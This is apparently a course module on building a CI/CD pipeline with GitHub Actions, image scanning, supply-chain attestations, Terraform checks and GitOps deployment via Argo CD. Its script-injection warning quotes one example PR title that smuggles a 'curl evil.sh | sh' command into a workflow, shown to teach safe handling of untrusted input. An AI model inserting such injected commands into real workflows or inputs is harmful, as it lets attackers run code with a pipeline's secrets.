## The brief

Project 1 gave you a repository that recreates a working environment with one command. It still depends on you: you build the image on your laptop, you decide which tag runs, and nobody checks a change before it lands. This project adds the delivery pipeline a real team would expect:

1. Every pull request is **linted, type-checked and tested**, and the charts and Terraform are validated, before review.
2. Every merge to `main` builds a **multi-arch image** once, **scans it**, attaches an **SBOM and provenance**, and pushes it to GHCR with **immutable tags**.
3. Infrastructure code gets `fmt`, `validate`, `terraform test`, a **plan**, and a full **ephemeral end-to-end deploy on kind** inside CI.
4. Deployment is **GitOps**: CI commits the new image reference to a values file; Argo CD, running inside the cluster, pulls and applies it. CI never holds cluster credentials.
5. Production promotion is a **semver tag** plus a **manual approval** on a GitHub environment.

You will write two workflow files (`app.yml` and `platform.yml`), a Dependabot config, and extend the Argo CD bootstrap from Project 1. The complete files are in the labs.

## The pipeline at a glance

```text
 Pull request (app/**, infra/**, deploy/**)                         nothing is pushed or deployed
 ┌─────────────────────────────────────────────────────────────────────────────────────────────┐
 │ app.yml       check: npm ci → lint → typecheck → test                                       │
 │               image: build linux/amd64 (local) → Trivy gate                                 │
 │ platform.yml  helm: lint → template → kubeconform     terraform: fmt → validate → test      │
 │               e2e: kind cluster → plan → apply → smoke.sh → destroy                          │
 └─────────────────────────────────────────────────────────────────────────────────────────────┘

 Merge to main
 ┌─────────────────────────────────────────────────────────────────────────────────────────────┐
 │ check ──► image: build amd64 → Trivy gate → build amd64+arm64 → push GHCR                   │
 │                  tags: sha-1a2b3c4, main      + SBOM + provenance + GitHub attestation      │
 │       ──► deploy-dev (environment: dev)                                                     │
 │              yq: deploy/envs/dev/values.yaml  image.tag=sha-1a2b3c4, image.digest=sha256:… │
 │              git commit + push  ─────────────────────────────┐                              │
 └──────────────────────────────────────────────────────────────┼──────────────────────────────┘
                                                                ▼
                                       ┌────────────── kind cluster ────────────────┐
                                       │ Argo CD polls Git (~3 min) ─► diff ─► sync │
                                       │ Application shipit-api-dev → ns shipit     │
                                       └────────────────────────────────────────────┘
 Tag v1.4.0
 ┌─────────────────────────────────────────────────────────────────────────────────────────────┐
 │ check ──► image (tags 1.4.0, 1.4, sha-…) ──► deploy-prod (environment: production)          │
 │                                               ⏸ waits for a required reviewer               │
 │                                               yq: deploy/envs/prod/values.yaml → commit     │
 └─────────────────────────────────────────────────────────────────────────────────────────────┘
```

Four principles drive every choice in this diagram. Learn them by name; they are what interviewers listen for.

- **Fast feedback first.** Cheap checks (lint, unit tests) run first and in parallel; expensive ones (multi-arch build, e2e) run only after them, and only when relevant paths changed.
- **Build once, promote many.** The image is built exactly once per commit. Dev and production run the same bytes, identified by digest. Promotion changes a pointer, never rebuilds.
- **Immutable, traceable artifacts.** Every image can be traced to a commit (`sha-` tag, OCI labels, provenance) and verified (attestation). Mutable tags like `latest` or `main` are for humans, never for deployments.
- **Least privilege.** Each job declares only the permissions it needs. CI has no cluster credentials at all, and cloud access (when you add it) uses short-lived OIDC tokens instead of stored keys.

## GitHub Actions essentials you will use

You know the basics of workflows, jobs and steps. These are the features this project leans on:

| Feature | Where | Why |
| --- | --- | --- |
| `on.<event>.paths` | both workflows | Run app jobs only when app code changes; bot commits to `deploy/envs/**` trigger nothing |
| `concurrency` | workflow and deploy jobs | Cancel superseded PR runs; serialise GitOps commits so two merges never race on the same file |
| `permissions` (top-level `contents: read`, widened per job) | everywhere | The `GITHUB_TOKEN` is least-privilege by default in your workflow, not in GitHub's org defaults |
| `needs` + job `outputs` | `image` → `deploy-*` | Pass the tag and digest from the build job to the promotion job |
| `environment` | `deploy-dev`, `deploy-prod` | Deployment history in the UI, environment-scoped secrets, required reviewers, branch/tag rules |
| `if:` conditions | push vs PR, tags | PRs never push images or deploy |
| `$GITHUB_OUTPUT`, `$GITHUB_ENV`, `$GITHUB_STEP_SUMMARY` | build and plan steps | Pass values between steps, render a readable summary on the run page |
| Actions cache (`type=gha`) | buildx | Layer cache shared across runs without a registry |

:::warning Script injection
Never interpolate untrusted values directly into `run:` scripts, for example `run: echo "${{ github.event.pull_request.title }}"`. A PR title like `"; curl evil.sh | sh; echo "` becomes shell code. Pass such values through `env:` and reference them as `"$TITLE"`. The workflows in the labs follow this pattern even for trusted values, so it becomes a habit. `actionlint` (and its embedded `shellcheck`) catches many of these mistakes; run it locally before pushing.
:::

## Building images in CI

### Tag strategy

| Tag | Example | Mutable? | Used for |
| --- | --- | --- | --- |
| `sha-<7 chars>` | `sha-1a2b3c4` | No (one per commit) | Dev deployments, traceability, debugging "what is running?" |
| Full semver | `1.4.0` | No (by convention: never re-push) | Production releases |
| Major.minor | `1.4` | Yes, moves to the newest patch | Consumers who want patches automatically |
| Branch / `main` | `main` | Yes | Humans pulling "latest main" locally |
| Digest | `sha256:9f…` | Immutable by definition | What Kubernetes should actually run |

`docker/metadata-action` generates the tag list and the OCI labels (`org.opencontainers.image.source`, `revision`, `created`) from the Git context. The `source` label also links the GHCR package to your repository, so it shows up on the repo page and inherits its access.

The GitOps commit writes **both** `image.tag` (readable) and `image.digest` (authoritative). The chart from Project 1 renders `repository@digest` when a digest is set. That defeats tag mutation entirely: even if someone re-pushes `1.4.0`, the cluster keeps running the exact image that was scanned and approved.

### Scan before push

The `image` job builds in three steps:

```text
 1. build linux/amd64 → load into the runner's Docker engine (tag shipit-api:ci)   cache: gha
 2. trivy image shipit-api:ci   → exit 1 on fixable HIGH/CRITICAL                  the gate
 3. build linux/amd64,linux/arm64 → push to GHCR (+ SBOM + provenance)             amd64 layers: cache hits
```

Why not push first and scan the pushed image? You could, and then gate only the deployment. The downside is that a vulnerable image sits in your registry with a valid-looking tag that someone may pull. Scanning a locally loaded single-platform build first means **nothing unscanned is ever published**. The cost is small: step 3 reuses the amd64 layers from the cache and only builds arm64 new. The remaining gap (the arm64 variant is not scanned separately) is acceptable because both variants contain the same Debian packages and the same `node_modules`; scanning each platform of the pushed index is a reasonable hardening step for later.

:::info Multi-arch speed in CI
GitHub's standard `ubuntu-latest` runners are amd64, so the arm64 variant builds under QEMU emulation. For shipit-api only `npm ci --omit=dev` runs emulated (the TypeScript build uses `--platform=$BUILDPLATFORM`), so it takes seconds. For heavier images, use native arm64 runners (`ubuntu-24.04-arm`, free for public repositories) in a matrix, push each platform by digest, and merge them into one index with `docker buildx imagetools create`. Docker's documentation has a ready-made workflow for this "distribute build across multiple runners" pattern.
:::

### Supply chain: SBOM, provenance, attestations, pinning

- **SBOM** (Software Bill of Materials, `sbom: true`): BuildKit scans the image and attaches an SPDX document listing every OS package and npm module. When the next big CVE drops, you can answer "which of our images contain it?" without rebuilding anything.
- **Provenance** (`provenance: mode=max`): a SLSA provenance statement attached to the image: which source, which commit, which build parameters, which builder. `mode=max` includes the full build definition.
- **GitHub artifact attestation** (`actions/attest-build-provenance`): a provenance statement signed with a short-lived certificate tied to your workflow's OIDC identity and logged in a transparency log. Anyone can verify it: `gh attestation verify oci://ghcr.io/<you>/shipit-api:sha-1a2b3c4 --owner <you>`. This is what lets a cluster admission policy say "only run images built by this repository's workflow on `main`".
- **Pinning**: third-party actions run with your token and secrets. A tag like `@v3` is a mutable Git ref.

:::warning A real incident: mutable action tags (March 2026)
On 19 March 2026, attackers force-pushed most version tags of `aquasecurity/trivy-action` and all tags of `aquasecurity/setup-trivy` to malicious commits, and published compromised Trivy binaries and images (v0.69.4 to v0.69.6). Every workflow referencing those actions by tag ran the attacker's code with its secrets for several hours. Workflows pinned to a full commit SHA were unaffected. The lesson: pin third-party actions to full 40-character commit SHAs (keep the version as a comment), let Dependabot propose updates, and give each job only the permissions it needs so a compromised step can do less damage. Lab 3 walks you through pinning.
:::

## Validating Helm charts and Terraform in CI

**Helm**: `helm lint` catches chart structure problems; it does not validate Kubernetes schemas. `helm template ... | kubeconform` renders the manifests and validates them against the Kubernetes OpenAPI schemas and, with an extra schema location, against CRD schemas such as Gateway API's HTTPRoute. Render with optional features turned **on** (`--set autoscaling.enabled=true --set networkPolicy.enabled=true`), otherwise the HPA and NetworkPolicy templates are never checked. On `main`, the chart is packaged and pushed to GHCR as an **OCI artifact** (`helm push ... oci://ghcr.io/<you>/charts`), so other repos and Argo CD could consume a versioned chart instead of a Git path.

**Terraform**, in increasing cost:

1. `terraform fmt -check -recursive`: formatting is not a matter of taste in CI.
2. `terraform init` + `terraform validate`: syntax, references, types. No credentials needed.
3. `terraform test`: the `plan.tftest.hcl` from Project 1 uses `mock_provider` blocks, so it checks your logic (count conditions, validation rules, labels) with no Docker and no cluster.
4. `terraform plan` against real infrastructure: in this project, the e2e job creates the kind cluster first (`-target=kind_cluster.this`, the same bootstrap as `make up`), then plans everything and saves `plan.txt` as an artifact and a summary line on the run page.
5. Apply, smoke test, destroy, on an ephemeral cluster inside the runner. This is the strongest signal you can get for free, and it proves the "from zero" claim on a machine that is not yours.

:::deep How plan works in a real team (remote state, PR comments, OIDC)
For cloud infrastructure, the plan must run against the **real remote state** (S3 with `use_lockfile = true`, or HCP Terraform) with **read-only** cloud credentials, and the apply runs only after merge with write credentials, often behind an environment approval. Typical shape:

- `pull_request`: `terraform plan -out=tfplan`, post the plan (or a summary) as a PR comment, upload the plan file.
- `push` to `main` (or a manual approval): `terraform apply tfplan` or a fresh plan + apply, in a job with `environment: production`.
- Credentials: an IAM role that GitHub can assume via OIDC, with a trust policy restricted to `repo:<owner>/<repo>:pull_request` for the plan role and `repo:<owner>/<repo>:environment:production` for the apply role.
- Locking: CI jobs that touch the same state must be serialised (`concurrency`), and a cancelled apply can leave a lock behind; Project 3 has a drill for that.

Tools such as Atlantis, Terramate, Spacelift or HCP Terraform implement this flow for you; knowing the raw version makes you effective with any of them.
:::

## Deployment: push vs pull

There are two ways to get a new version into a cluster.

```text
 PUSH (CI deploys)                              PULL / GitOps (cluster deploys itself)
 ┌────────┐ kubeconfig/cloud creds ┌───────┐    ┌────────┐  git commit  ┌──────┐  poll/watch  ┌─────────┐
 │   CI   │ ─────────────────────► │cluster│    │   CI   │ ───────────► │ Git  │ ◄─────────── │ Argo CD │
 └────────┘  helm upgrade/kubectl  └───────┘    └────────┘              └──────┘   apply diff  │(in-cluster)
                                                                                               └─────────┘
```

Why pull-based delivery wins for Kubernetes clusters:

| Concern | Push | Pull (GitOps) |
| --- | --- | --- |
| Credentials | CI holds cluster-admin-ish credentials; a compromised workflow owns the cluster | Cluster credentials never leave the cluster; CI only needs write access to one repo path |
| Network | CI must reach the API server (public endpoint or self-hosted runners in the VPC) | Cluster only needs outbound access to Git and the registry; API server can stay private |
| Drift | Detected only at the next deploy (and, as you saw in Project 1, `helm_release` may not see it at all) | Continuously compared and optionally self-healed |
| Audit and rollback | Pipeline logs; rollback means re-running an old pipeline | Git history is the deployment log; rollback is `git revert` |
| Many clusters | CI must know and reach every cluster | Each cluster pulls its own config; adding a cluster is adding an Application |
| Desired state | Implicit, spread across pipeline runs | Explicit, versioned, reviewable in Git |

Push is still fine for simple setups, for non-Kubernetes targets, and for bootstrapping (Terraform installing Argo CD itself is a push). The practical rule: **push infrastructure bootstraps, pull applications.**

### Where does the GitOps config live?

| Option | Pros | Cons |
| --- | --- | --- |
| Same repo, `deploy/envs/<env>/values.yaml` (this project) | One place to look, simple, the chart and its values evolve together | Bot commits in the app history; branch protection must allow the bot or use PRs |
| Separate config repo | Clean separation of access (devs vs deployers), app history stays clean, one config repo for many apps | Two repos to keep in sync, cross-repo token needed |
| Argo CD Image Updater | No CI commit step at all; a controller watches the registry and writes back to Git | Another controller to operate; less explicit |

Two details make the same-repo approach work without surprises:

- **No infinite loop.** Pushes made with the workflow's `GITHUB_TOKEN` do not trigger new workflow runs (except `workflow_dispatch` and `repository_dispatch`), and the `paths` filters exclude `deploy/envs/**` anyway.
- **Branch protection.** If `main` requires pull requests, a direct bot push fails with a 403-style "protected branch" error. Either allow the GitHub Actions bot to bypass for that path (rulesets support bypass lists), or have the job open a PR (for example with `peter-evans/create-pull-request`) and auto-merge it for dev while production PRs need human review.

:::try Spot the deployment pointer
Open `deploy/envs/dev/values.yaml` after a few merges and run `git log --oneline -- deploy/envs/dev/values.yaml`. Every line is a deployment, with the image version in the commit message. How would you roll back dev to the previous version without CI? (Answer: `git revert <commit>` and push; Argo CD syncs the old digest. No rebuild, no pipeline.)
:::

## Environments, approvals and OIDC

A GitHub **environment** (Settings → Environments) is a named deployment target with protection rules:

- **Required reviewers**: the job pauses before starting until one of the listed people approves. Prevent self-review is available. On private repositories this requires a paid plan; public repositories get it for free.
- **Wait timer**: a delay before the job starts (useful for "bake time").
- **Deployment branches and tags**: only `main` may deploy to `dev`; only tags matching `v*` may deploy to `production`.
- **Environment secrets and variables**: available only to jobs that reference the environment, after approval.

In this project the production job does not touch the cluster; the approval gates the **commit** that Argo CD will apply. That is the GitOps version of a release approval, and it leaves a clean audit trail: who approved (GitHub), what changed (Git diff), when it synced (Argo CD).

### OIDC instead of long-lived secrets

When a workflow needs cloud access (pushing to ECR, running `terraform plan` against AWS, uploading to S3), do not store access keys as secrets. GitHub can issue a short-lived **OIDC token** for each job (`permissions: id-token: write`). The cloud provider trusts GitHub's issuer and exchanges the token for temporary credentials if the token's claims match a policy.

```text
 job (id-token: write) ──► GitHub OIDC provider: JWT
       iss = https://token.actions.githubusercontent.com
       aud = sts.amazonaws.com
       sub = repo:roma/shipit:environment:production      ◄── the claim you restrict on
 job ──► AWS STS AssumeRoleWithWebIdentity(JWT, role) ──► temporary credentials (1 h)
```

```yaml
permissions:
  id-token: write
  contents: read
steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/shipit-ci-plan
      aws-region: eu-central-1
  - run: aws sts get-caller-identity
```

The security lives in the role's **trust policy**: restrict `aud` to `sts.amazonaws.com` and `sub` to exactly the repository and context allowed (`repo:roma/shipit:pull_request` for a read-only plan role, `repo:roma/shipit:environment:production` for the apply role). A trust policy that only checks the issuer would let **any** GitHub repository assume your role. The same pattern exists for GCP (Workload Identity Federation), Azure (federated credentials), HashiCorp Vault, and HCP Terraform. You already use it in this project without noticing: `attest-build-provenance` signs with your workflow's OIDC identity. GHCR itself needs no OIDC; the `GITHUB_TOKEN` with `packages: write` is enough.

## Running workflows locally with act

`act` (github.com/nektos/act) runs workflow jobs in local Docker containers that imitate GitHub's runners. It is useful for iterating on shell steps without push-wait-fail cycles.

```bash
brew install act
act -l                                   # list jobs per event
act pull_request -j check                # run one job for a pull_request event
act pull_request -j terraform --container-architecture linux/amd64
```

Know its limits: runner images differ from GitHub's (use `-P ubuntu-latest=catthehacker/ubuntu:act-latest` for a closer match), there is no OIDC token, `GITHUB_TOKEN` must be passed manually (`-s GITHUB_TOKEN="$(gh auth token)"`), and GitHub-hosted services such as environments, the `type=gha` build cache and attestations are missing or emulated. `act` sets the environment variable `ACT=true`, so a step can opt out with `if: ${{ !env.ACT }}`. Treat it as a fast loop for `check`-style jobs, not as proof that the pipeline works.

:::mac act on Apple Silicon
act pulls runner images for your host architecture by default. Many actions and tools in those images assume amd64, so pass `--container-architecture linux/amd64` (emulated, slower but faithful) or put it in `~/.actrc`. Mounting the Docker socket into act containers works with Docker Desktop and OrbStack.
:::

## Pitfalls

:::warning Common pipeline mistakes
- **Uppercase owner in image names**: `ghcr.io/Roma/shipit-api` is rejected; registry paths must be lowercase. The workflows lowercase `github.repository_owner` with `${OWNER,,}`.
- **`denied: installation not allowed to Write organization package`** or **`permission_denied: write_package`**: the job lacks `packages: write`, or the package already exists and is not linked to this repository (Package settings → Manage Actions access).
- **Deploying `latest` or a branch tag**: Argo CD sees no change in Git, so nothing rolls out, or pods on different nodes run different images. Deploy digests.
- **Running the deploy job on PRs from forks**: forks get a read-only token and no secrets; your `if:` conditions must exclude them (the labs only deploy on `push`).
- **Two merges racing to bump the same values file**: one push is rejected. `concurrency: gitops-dev` plus `git pull --rebase` before `git push` handles it.
- **`terraform fmt` passes locally, fails in CI**: different Terraform versions format differently. Pin `required_version` and the version in `setup-terraform`.
- **Caching `node_modules` directly**: cache the npm download cache (`setup-node` with `cache: npm`) and run `npm ci`; restored `node_modules` can be stale or built for another platform.
- **Secrets in logs**: GitHub masks registered secrets, but not values derived from them (base64, substrings). Never `echo` credentials or `set -x` in steps that handle them.
:::

:::try Read a run like a reviewer
After your first green run, open the run page and answer: how long did each job take, which step dominated the `image` job, and how many cache hits did the second multi-arch build get (look for `CACHED` lines in the build log)? Quoting "PR feedback in under 3 minutes, merge-to-dev in under 10" is a strong portfolio line.
:::
